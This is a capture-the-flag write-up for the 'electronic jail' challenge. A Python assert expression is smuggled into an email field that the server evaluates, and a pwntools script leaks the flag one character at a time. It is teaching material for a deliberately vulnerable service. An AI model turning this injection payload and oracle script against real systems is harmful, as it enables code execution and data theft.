# electronic jail — ImaginaryCTF Writeup

**Challenge:** electronic jail  
**Category:** Misc  
**Difficulty:** Hard  
**Points:** 100 pts  
**Flag:** `ictf{this_is_fine}`

---

## Description

> idk how to validate emails P.S. Please test your solve script locally before using it on remote.

**Connection:** `nc 155.248.210.243 42174`

---

## Background Knowledge (Read This First!)

### What is the Vulnerability?

The server validates input as an email address — but does so poorly. The email validation allows Python's `assert` statement to be embedded in the email, which gets **evaluated** by the server.

### What is the Payload?

```python
assert'ictf{...'in''+flag#@example.com
```

Breaking this down:
- `assert` — Python keyword that raises AssertionError if the condition is False
- `'ictf{...'in''+flag` — checks if our guess is a substring of the flag
- `#@example.com` — the `#` makes everything after it a comment, satisfying the email format

If our guessed prefix IS in the flag → assertion passes → no error
If it is NOT in the flag → AssertionError → we learn the guess was wrong

By testing character by character, we can **leak the flag one character at a time**.

### Why does this take 10+ minutes?

We must test each position one character at a time. Binary search using `or` can speed this up significantly by testing multiple possibilities at once.

---

## Solution

### Step 1 — Create the leak script

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ nano solve.py
```

```python
from pwn import *
import string

charset = string.ascii_letters + string.digits + '_{}'
flag = 'ictf{'

while not flag.endswith('}'):
    for c in charset:
        r = remote('155.248.210.243', 42174)
        payload = f"assert'{flag + c}'in''+flag#@example.com"
        r.sendlineafter(b'email: ', payload.encode())
        response = r.recvall(timeout=2)
        r.close()
        if b'AssertionError' not in response:
            flag += c
            print(f"Found: {flag}")
            break

print("Flag:", flag)
# → ictf{this_is_fine}
```

### Step 2 — Run it (be patient!)

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ python3 solve.py
# → Takes 10+ minutes character by character
# → ictf{this_is_fine}
```

---

## Tools Used

| Tool | Purpose | Level |
|------|---------|-------|
| Python 3 + pwntools | Character-by-character assert oracle | ⭐⭐⭐ Hard |

---

## Key Takeaways

- Poor email validation that evaluates Python expressions is a critical vulnerability
- `assert 'prefix' in flag` leaks one bit of information per query — is the prefix correct?
- Binary search with `or` can speed up the extraction significantly
- Always test locally before running on remote — 10+ minutes of queries can get you banned!
